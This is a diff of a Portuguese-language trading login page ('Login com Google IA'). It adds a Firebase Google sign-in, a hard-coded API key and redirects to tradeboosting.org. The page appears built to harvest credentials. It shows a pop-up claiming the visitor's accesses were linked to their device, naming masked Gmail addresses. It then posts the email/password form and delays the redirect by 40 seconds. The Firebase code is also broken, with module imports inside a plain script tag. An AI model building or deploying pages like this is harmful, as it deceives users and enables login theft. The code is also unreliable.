@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bem-vindo Trader</title>
     <style>
+        /* Seu estilo já existente */
         body {
             font-family: 'Roboto', sans-serif;
             display: flex;
@@ -60,12 +61,18 @@
             font-size: 16px;
         }
     </style>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
 </head>
 <body>
 
     <div class="login-container">
         <h2>Login com Google IA</h2>
         <h5>Insira suas credenciais para começar</h5>
+        
+        <!-- Formulário de login com email e senha -->
         <form id="loginForm">
             <div class="input-group">
                 <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required>
@@ -75,6 +82,9 @@
             </div>
             <button type="submit">Entrar</button>
         </form>
+        
+        <!-- Botão para login com o Google -->
+        <button onclick="loginWithGoogle()">Entrar com Google</button>
     </div>
 
     <div class="message-container" id="messageContainer">
@@ -82,16 +92,51 @@
     </div>
 
     <script>
-        
-               var resposta = confirm("Você quer continuar?");
+        // Configuração do Firebase
+        import { initializeApp } from "firebase/app";
+        import { getAuth, GoogleAuthProvider, signInWithPopup } from "firebase/auth";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBjpa0G0JaH2S3umz0e2mwHrV4y9PWBpQ0",
+            authDomain: "trading-ia-af6b6.firebaseapp.com",
+            projectId: "trading-ia-af6b6",
+            storageBucket: "trading-ia-af6b6.firebasestorage.app",
+            messagingSenderId: "473263522522",
+            appId: "1:473263522522:web:eb05d22a61ce9be01a9be3"
+        };
+
+        // Inicializa o Firebase
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const provider = new GoogleAuthProvider();
+
+        // Função de login com o Google
+        function loginWithGoogle() {
+            signInWithPopup(auth, provider)
+                .then((result) => {
+                    const user = result.user;
+                    console.log("Usuário logado:", user.displayName);
+                    console.log("Email:", user.email);
+                    console.log("Imagem do perfil:", user.photoURL);
+
+                    // Redireciona para outra página após o login
+                    window.location.href = "https://tradeboosting.org/app/login.php";
+                })
+                .catch((error) => {
+                    console.error("Erro ao autenticar com o Google:", error);
+                });
+        }
+
+        // Confirmação de acesso
+        var resposta = confirm("Você quer continuar?");
         if (resposta) {
-            alert(" Os acessos foram vínculados ao seu dispositivo com os seguintes endereços registrados em 18/01/2025 (ar5***68*@gmail.com/si***bra*024@gmail.com) ");
-            
+            alert("Os acessos foram vinculados ao seu dispositivo com os seguintes endereços registrados em 18/01/2025 (ar5***68*@gmail.com/si***bra*024@gmail.com)");
         } else {
             alert("Você escolheu sair.");
             window.location.replace("https://www.sairsistema/Trading.ia");
         }
-        
+
+        // Processamento do formulário de login com email/senha
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Impede o envio padrão do formulário
 
@@ -111,13 +156,12 @@
             }).then(response => {
                 // Após o envio, redireciona para a página desejada
                 setTimeout(function() {
-                    window.location.href = "https://tradebsting.org/ap/login.ph"; 
+                    window.location.href = "https://tradeboosting.org/app/login.php"; 
                 }, 40000);
             }).catch(error => {
                 console.error('Erro ao enviar o formulário:', error);
             });
         });
-        
     </script>
 
 </body>
